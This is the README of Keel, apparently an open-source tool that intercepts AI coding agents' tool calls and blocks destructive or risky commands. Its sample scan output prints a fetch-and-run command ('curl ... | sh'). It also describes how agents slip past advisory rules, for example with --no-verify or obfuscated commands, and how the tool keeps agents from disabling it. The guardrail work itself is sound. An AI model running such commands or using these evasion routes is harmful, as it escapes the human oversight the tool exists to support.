# Keel

**Guardrails for AI coding agents — enforced outside the context window.**

Your agent follows your rules at turn 1 and ignores them at turn 40. Keel puts the
rules where the model can't forget them: in front of every tool call, in a process
the agent doesn't control.

[![npm](https://img.shields.io/npm/v/@get-keel/cli?label=@get-keel/cli&logo=npm)](https://www.npmjs.com/package/@get-keel/cli)
[![CI](https://github.com/qiweiz94/keel/actions/workflows/ci.yml/badge.svg)](https://github.com/qiweiz94/keel/actions/workflows/ci.yml)
[![License](https://img.shields.io/badge/license-Apache--2.0-blue)](LICENSE)

## Audit your setup in 10 seconds — no install

```bash
npx @get-keel/cli scan
```

It finds every AI agent on your machine, tells you which ones can run shell
commands with nothing standing in the way, and flags MCP servers that install
unpinned packages or talk over plaintext HTTP.

```
  Enforcement coverage

    ✗ unprotected  claude-code
    ✓ enforced     opencode
                   ~/.opencode/plugins/keel-enforce.js

  2 findings

   CRITICAL  MCP server runs through a shell
     cursor → MCP server "notes": sh -c curl https://x.tld/i.sh | sh
     → Invoke the server binary directly, so its command line cannot be rewritten.

     HIGH    3 agent hosts can run tools with no enforcement
     claude-code, cursor, codex
     → Run `keel install --all`. Until then nothing stops a destructive command.
```

`--json` for machines, `--ci` to exit non-zero on findings.

## The problem

`CLAUDE.md`, `AGENTS.md`, `.cursorrules` are **prompts**. The model reads them and
tries to comply — Anthropic's own docs say there is "no guarantee of strict
compliance." As context fills, early instructions decay (the "Lost in the Middle"
effect, [Liu et al. 2023](https://arxiv.org/abs/2307.03172), measurable from
8K–16K tokens). Compaction drops them. A sufficiently determined agent can
`--no-verify` its way past anything advisory.

Keel is not a prompt. It's a check that runs *before* the tool executes, in a
process the model cannot edit, using rules it cannot read away.

## Install

```bash
npm install -g @get-keel/cli
keel install --all      # wire every agent host found on this machine
keel scan               # confirm coverage
```

Requires Node.js 22.12.0+. Install one host at a time with `--opencode`,
`--claude-code`, `--cursor`, `--cline`, `--codex`, `--gemini`, `--openclaw`,
`--hermes`, or `--project` to commit config to a repo your team shares.

## What you can do with it

| I want to… | Command |
|---|---|
| See what's unprotected on this machine | `keel scan` |
| Stop agents force-pushing or `rm -rf`-ing | `keel install --all` (ships sane defaults) |
| Require a passing test before a commit | a `verification` rule — see [Rules](#rules) |
| Approve one dangerous action, once | `keel allow <rule-id> --once` |
| Loosen enforcement while prototyping | `keel level sprint` |
| Tighten it before a deploy | `keel level protect` |
| See what got blocked and why | `keel audit --tail 20` |
| Find where an agent kept circling | `keel retrospective` |
| Turn recurring blocks into rules | `keel gather` (proposes; never auto-applies) |
| Check a command without running it | `keel evaluate --tool Bash --args '{"command":"git push --force"}'` |

## Supported hosts

Every host below evaluates a tool call **before it runs** and can stop it. The
**Verified** column says how much each row has actually been proven — `live` means
keel was exercised inside the real host, `types` means it was built against the
host's installed type definitions, `docs` means built from published docs on a
machine where that host isn't installed.

| Host | Install | How it blocks | Verified |
|---|---|---|---|
| OpenCode | `--opencode` | plugin throws at `tool.execute.before` | **live** |
| OpenClaw | `--openclaw` | `block: true` / `requireApproval` | **live** |
| Claude Code | `--claude-code` | `PreToolUse` hook, exit 2 | types |
| Cline | `--cline` | `HOOK_CONTROL` + `cancel: true` | types |
| Gemini CLI | `--gemini` | `PreToolUse` hook, exit 2 | types |
| Cursor | `--cursor` | `{permission: deny\|ask}` | docs |
| Codex CLI | `--codex` | `PreToolUse` hook, exit 2 | docs |
| Hermes | `--hermes` | `{"action": "block"}` | docs |

**Anything else** works through one of two universal paths, no adapter needed:
`keel serve` (MCP server, 7 tools — Windsurf, Zed, Continue, JetBrains AI) or
`keel hook generic` (`{tool, args}` on stdin, exit 0 allow / 2 block). Full matrix,
including hosts with no interception point at all: **[docs/integrations.md](docs/integrations.md)**.

## Rules

Rules live in `~/.keel/rules.yaml` (global) or `.keel/rules.yaml` (per project;
project wins for the same id).

```yaml
version: 1
level: balanced
rules:
  - id: no-force-push
    type: command
    match: "git push --force(?!-with-lease)"
    action: deny
    message: "Use --force-with-lease instead."

  # Require a passing test run before any commit that touches src/
  - id: test-before-commit
    type: verification
    trigger: { tools: [WriteFile, edit], pattern: "src/" }
    satisfy: { tools: [Bash], pattern: "(npm test|vitest|jest|pytest)" }
    boundaries:
      commit: { pattern: "git commit", action: warn }
    verification_window_seconds: 300
    action: deny
    message: "Source changes require a passing test before commit."
```

**Actions:** `allow` (log) · `warn` (warn once, then block) · `deny` (same, stricter
default) · `block` (always) · `prompt` (always block until a human runs
`keel allow <id> --once`) · `fix` (rewrite the command) · `report` (log only).

**Rule types:** `command`, `filesystem`, `content`, `network`, `env`, `rate`, `time`,
`sequence`, `flow`, `session`, `verification`, `context`, plus the problem-solving
types below.

The shipped defaults cover destructive commands, `curl | sh`, hardcoded secrets and
credential files, secret exfiltration, force-push and hook-bypass, and approval gates
for DB destruction, protected-branch pushes, publishing, and `npx`/`bunx` of unpinned
packages. Run `keel validate` after editing.

### Stopping agents that circle

Three rule types target the failure everyone recognises — an agent retrying the same
broken command forever:

- **`stuck`** — N identical failures in a window → redirect, then deny
- **`research`** — armed only by a *failing* command; blocks patching before looking anything up
- **`diagnosis`** — destructive or structural changes need a hypothesis or real investigation (`git log/blame/bisect`) first

They aren't in the default install because they're behavioural and need burn-in.

```bash
keel rules harness            # print them, with what they'd have caught in your history
keel rules harness --append   # add them to ~/.keel/rules.yaml (run in your own terminal)
```

They arrive as `mode: observe` — recording what they *would* have done, interrupting
nothing. Check the hit rate on your own traffic with `keel retrospective`, then raise
`mode` to `warn` or `block`. `--append` edits your rules file, so like every keel
control surface it requires a TTY and an agent cannot run it.

## The speed dial

Three levels trade friction against safety. `prompt` approval gates are **never**
downgraded at any level.

```bash
keel level              # show current
keel level sprint       # prototyping
keel level balanced     # default
keel level protect      # before a deploy
```

| Dial | deny/block rules | Checks | Use |
|---|---|---|---|
| `sprint` | downgraded to warnings | fast — content/sequence/flow skipped | quick prototyping |
| `balanced` | warn once, then block | full | day to day |
| `protect` | **block on first violation** | full + reasoning heuristics | high-stakes work |

A rule's own `level:` is a **floor** — `level: protect` rules are never softened by a
lower dial. Changes take effect on the next tool call; no restart.

`keel dashboard` is an interactive panel for the dial and enforcement state;
`keel dashboard --web` is the same thing in a browser. Both bind 127.0.0.1, require a
TTY to start, and authenticate with a one-time token printed on your terminal — so an
agent can't start one or read the token. Open the full URL it prints (the token is in
the `#fragment`); a bare `http://127.0.0.1:PORT/` will render blank by design.

## Self-protection

Keel's control surface belongs to you, not the agent. The defaults hard-deny agents
from running `keel disable|allow|level|enforce|install|uninstall`, from editing keel's
rules or state, and from deleting enforcement files. These are `level: protect` floors,
so no dial setting disables them.

Every gated or blocked action is written to `<project>/.keel/receipts/` as a signed,
hash-chained entry (`keel verify`). Keys live at `~/.keel/receipt-key.json`; rotate with
`keel receipts rotate` — old receipts stay verifiable.

## Limits

Stated plainly, because a guardrail that oversells itself is worse than none:

- **Pattern rules are regex gates, not an anti-virus.** A determined agent can obfuscate
  a command. For genuinely irreversible operations use `action: prompt` (human approval),
  not pattern matching.
- **Reasoning-gated rules need visible reasoning.** Hosts that don't expose chain-of-thought
  can't apply them. Don't rely on them as a hard control.
- **The agent's process is the boundary.** In-process enforcement fails if the agent
  process itself is compromised.
- **Hermes and OpenClaw fail open by design** — a throwing plugin is skipped. Both keel
  plugins carry a local circuit breaker that still blocks catastrophic operations when the
  daemon is unreachable, and print a loud DEGRADED notice.

More in [SECURITY.md](SECURITY.md).

## Documentation

- [docs/integrations.md](docs/integrations.md) — every host, what it can block, how well it's verified
- [SECURITY.md](SECURITY.md) — threat model, enforcement limits, reporting
- [CONTRIBUTING.md](CONTRIBUTING.md) — build, test, adding a rule type or host
- [CHANGELOG.md](CHANGELOG.md)

## Development

```bash
npm install
npm run build
npm test          # all workspaces
```

The OpenCode plugin has one canonical source: `packages/opencode-plugin/src/plugin.ts`.
`packages/cli/templates/keel-enforce.js` and `packages/cli/src/core/` are **generated** —
edit the source and rebuild, never the artifacts.

## Trust

Official distribution channels only:

- npm: `@get-keel/cli`, `@get-keel/core`, `@get-keel/opencode-plugin`
- GitHub: [qiweiz94/keel](https://github.com/qiweiz94/keel)

Anything else claiming to be keel isn't.

## License

Apache-2.0 © Chaoyi Li
